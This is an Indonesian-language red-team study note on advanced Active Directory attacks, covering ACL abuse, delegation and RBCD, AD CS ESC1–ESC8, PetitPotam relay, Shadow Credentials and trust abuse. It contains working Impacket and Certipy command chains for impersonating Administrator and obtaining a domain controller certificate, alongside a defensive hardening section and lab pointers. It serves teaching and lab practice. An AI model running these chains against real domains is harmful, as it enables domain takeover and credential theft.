# 🏰🔥 Active Directory Attacks Lanjutan

> [!summary] Ringkasan
> Lanjutan dari [[Active Directory Attacks]] (Kerberoasting, AS-REP, DCSync, Golden Ticket sudah dibahas di sana). Note ini masuk ke jalur **eskalasi & lateral movement modern** yang dipakai red team enterprise nyata: **ACL/ACE abuse**, **Kerberos delegation** (unconstrained/constrained/RBCD), **AD CS (ESC1–ESC8)**, **coercion + NTLM relay** (PetitPotam/PrinterBug), **Shadow Credentials**, dan **serangan trust antar-domain/forest**. Fokus: bagaimana objek & relasi yang "salah konfigurasi" dirantai menjadi **Domain/Enterprise Admin**. Selalu petakan dulu dengan [[Active Directory Attacks|BloodHound]].

**Bagian dari:** [[Red Team (MOC)]]
**Prasyarat:** [[Active Directory Attacks]], [[Windows & Active Directory Dasar]], [[Post-Exploitation & Pivoting]]

> [!note] Tingkat lanjut & sangat kontekstual
> Teknik di sini jarang "satu tembakan" — biasanya **rantai** (chain) beberapa primitif kecil. BloodHound + pemahaman objek AD (ACE, SPN, msDS-* attributes) adalah kuncinya. Latih di [[Lab — AD Lab Lokal (GOAD)]].

---

## 🧠 Konsep Inti

### 1. ACL / ACE Abuse (hak atas objek)
Setiap objek AD punya **DACL** (daftar siapa boleh apa). Hak berbahaya yang dicari BloodHound:
| Hak (ACE) | Penyalahgunaan |
|---|---|
| **GenericAll / GenericWrite** | kuasai objek penuh: reset password, set SPN (targeted Kerberoast), Shadow Creds |
| **WriteDACL** | tambahkan hak untuk diri sendiri → eskalasi |
| **WriteOwner** | jadikan diri owner → ubah DACL |
| **ForceChangePassword** | reset password user target |
| **AddMember** | masukkan diri ke grup (mis. ke grup yang punya hak lebih) |
- Tools: **PowerView** (`Add-DomainObjectAcl`), **Impacket** `dacledit.py`, BloodHound "shortest path".

### 2. Kerberos Delegation
- **Unconstrained delegation** — server menyimpan **TGT** siapa pun yang terhubung. Paksa DC connect (coercion) → tangkap TGT DC → `DCSync`.
- **Constrained delegation** (`msDS-AllowedToDelegateTo`) — salahgunakan **S4U2Self/S4U2Proxy** untuk meniru user mana pun ke service tertentu.
- **Resource-Based Constrained Delegation (RBCD)** — jika punya `GenericWrite` pada komputer target, set `msDS-AllowedToActOnBehalfOfOtherIdentity` ke akun kita → impersonasi admin lokal di host itu. Salah satu jalur eskalasi paling populer.

### 3. AD CS Abuse (ESC1–ESC8)
**Active Directory Certificate Services** salah konfigurasi = sertifikat → autentikasi sebagai siapa pun.
| ESC | Inti masalah |
|---|---|
| **ESC1** | template izinkan **enrollee supply subject** (SAN) → minta sertifikat atas nama Domain Admin |
| **ESC2** | template "Any Purpose" / no EKU |
| **ESC3** | Enrollment Agent disalahgunakan |
| **ESC4** | hak tulis atas **template** → ubah jadi rentan (ESC1) |
| **ESC6** | flag `EDITF_ATTRIBUTESUBJECTALTNAME2` di CA |
| **ESC8** | **NTLM relay ke endpoint HTTP CA** (web enrollment) |
- Tools: **Certify** / **Certipy** (`certipy find -vulnerable`, `req`, `auth`).

### 4. Coercion + NTLM Relay
- **Coercion** — paksa mesin (terutama DC) autentikasi ke kita: **PetitPotam** (MS-EFSRPC), **PrinterBug/SpoolSample** (MS-RPRN), **DFSCoerce**, **ShadowCoerce**.
- **Relay** — teruskan autentikasi yang dipaksa itu ke target lain dengan **ntlmrelayx**: ke LDAP (set RBCD), ke AD CS web enroll (**ESC8** → sertifikat DC → DCSync). Mitigasi: signing & EPA.

### 5. Shadow Credentials
Jika punya `GenericWrite`/`GenericAll` atas user/komputer → tulis **`msDS-KeyCredentialLink`** (Key Trust) → autentikasi Kerberos sebagai objek itu **tanpa reset password** (lebih senyap). Tool: **Whisker** / **pyWhisker** + **Rubeus**.

### 6. Trust Attacks (lintas domain/forest)
- **SID History abuse** — suntik SID grup istimewa (mis. Enterprise Admins) → **cross-domain golden ticket**.
- **Trust key / inter-realm TGT** — forge tiket lintas trust.
- Child→Parent domain biasanya bisa dieskalasi ke **Enterprise Admin** dalam satu forest.

---

## ⚙️ Cara Kerja / Praktik (selalu di lab!)

### RBCD (rantai khas)
```bash
# 1) buat computer account (default MachineAccountQuota=10):
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' corp.local/user:pass
# 2) set RBCD pada target (butuh GenericWrite atas target):
rbcd.py -delegate-to 'TARGET$' -from 'EVIL$' -action write corp.local/user:pass
# 3) S4U → tiket impersonasi Administrator ke target:
getST.py -spn cifs/target.corp.local -impersonate Administrator -dc-ip <dc> corp.local/'EVIL$':'P@ss'
# 4) pakai tiket:
export KRB5CCNAME=Administrator.ccache; psexec.py -k -no-pass target.corp.local
```

### AD CS — ESC1 dengan Certipy
```bash
certipy find -u user@corp.local -p pass -dc-ip <dc> -vulnerable
certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip <dc>   # → hash/TGT administrator
```

### PetitPotam → relay ke AD CS (ESC8)
```bash
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py <attacker-ip> <dc-ip>    # paksa DC auth → sertifikat DC → DCSync
```

> [!tip] Selalu mulai dari BloodHound
> Sebelum mencoba teknik apa pun, kumpulkan data (`SharpHound`/`bloodhound-python`) dan cari **"shortest path to Domain Admins"**. BloodHound menandai ACE abuse, delegasi, dan sesi yang membuka jalur — jauh lebih efisien daripada menebak.

---

## 🛡️ Sisi pertahanan

- **ACL** — audit hak berbahaya (BloodHound defensif), prinsip least privilege, lindungi grup Tier-0.
- **Delegation** — tandai akun sensitif "Account is sensitive and cannot be delegated"; minimalkan unconstrained.
- **AD CS** — audit template (`certipy find`), buang `EDITF_ATTRIBUTESUBJECTALTNAME2`, manager approval, EKU ketat.
- **Coercion/Relay** — aktifkan **SMB/LDAP signing**, **EPA**, patch PetitPotam, nonaktifkan Spooler di DC, **Channel Binding**.
- **Umum** — model **tiered admin**, **LAPS**, monitoring Event ID AD (lihat [[Log Analysis & Monitoring]]), deteksi via [[Threat Hunting]].

## 🧰 Tools

- **BloodHound / SharpHound** — pemetaan jalur (wajib).
- **Certipy / Certify** — enumerasi & abuse AD CS.
- **Impacket** — `rbcd.py`, `addcomputer.py`, `getST.py`, `ntlmrelayx.py`, `dacledit.py`.
- **Rubeus** — operasi Kerberos (S4U, asktgt, monitor).
- **Whisker / pyWhisker** — Shadow Credentials.
- **PowerView / PowerSploit** — manipulasi objek & ACL.
- **Coercer / PetitPotam / SpoolSample** — coercion.
- **mimikatz** — kredensial & tiket (lihat [[Active Directory Attacks]]).

## 🔗 Kaitan

- Dasar AD & teknik klasik: [[Active Directory Attacks]] (Kerberoasting/DCSync/Golden Ticket).
- Banyak langkah butuh kredensial/hash dari [[Password Attacks]] & gerak lateral [[Post-Exploitation & Pivoting]].
- Memetakan ke *Privilege Escalation / Lateral Movement / Credential Access* di [[Cyber Kill Chain & MITRE ATT&CK]].
- **Sisi Blue ↔** [[Hardening & Vulnerability Management]] (tiered admin, LAPS, hardening AD CS), [[Threat Hunting]] & [[Log Analysis & Monitoring]] (deteksi coercion/ESC8/RBCD), [[Incident Response]].
- Latih di [[Lab — AD Lab Lokal (GOAD)]] (GOAD memang penuh misconfig ACL/delegation/ADCS).

## 🎯 Latihan

- **[[Lab — AD Lab Lokal (GOAD)]]** — GOAD dirancang persis untuk teknik di note ini (ACL, delegation, ADCS, trust).
- **TryHackMe** — room *AD CS / Kerberos delegation*; **HTB Pro Labs** (Dante/Zephyr/Rastalabs).
- Rantai latihan: dari user biasa → BloodHound → temukan `GenericWrite` → RBCD atau Shadow Creds → admin host → DCSync.

## 📖 Sumber

- **The Hacker Recipes — AD** (referensi terbaik tiap teknik) — https://www.thehacker.recipes/ad/
- **Certified Pre-Owned** (paper AD CS, SpecterOps) — dasar ESC1–ESC8.
- **HackTricks — AD Methodology** — https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- **BloodHound docs** — https://bloodhound.readthedocs.io
